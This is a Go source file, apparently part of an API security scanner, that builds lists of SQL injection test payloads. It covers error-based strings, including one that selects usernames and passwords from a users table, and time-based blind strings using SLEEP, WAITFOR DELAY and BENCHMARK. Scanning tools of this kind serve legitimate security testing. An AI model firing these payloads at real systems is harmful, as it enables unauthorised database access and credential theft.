package payload

import "github.com/alkaid/goapiscanner/internal/model"

func sqli() []Item {
	vals := []string{
		"' OR '1'='1",
		"' OR 1=1--",
		"\" OR \"\"=\"",
		"') OR ('1'='1",
		"1' AND '1'='1",
		"admin'--",
		"1 UNION SELECT NULL--",
		"1' UNION SELECT NULL,NULL--",
		"' UNION SELECT username,password FROM users--",
		"1; SELECT 1",
		"' OR 1=1#",
		"1' OR '1'='1' /*",
		"\" OR 1=1--",
		"or 1=1--",
	}
	out := make([]Item, 0, len(vals))
	for _, v := range vals {
		out = append(out, Item{Class: model.ClassSQLi, Value: v, Hint: "error-based"})
	}
	return out
}

func timeBlind() []Item {
	vals := []string{
		"1' AND SLEEP(3)--",
		"1 AND SLEEP(3)",
		"1'; WAITFOR DELAY '0:0:3'--",
		"1) AND BENCHMARK(5000000,SHA1(1))--",
		"1' AND (SELECT SLEEP(3))--",
	}
	out := make([]Item, 0, len(vals))
	for _, v := range vals {
		out = append(out, Item{Class: model.ClassTimeBlind, Value: v, Hint: "timing", Timeout: true})
	}
	return out
}
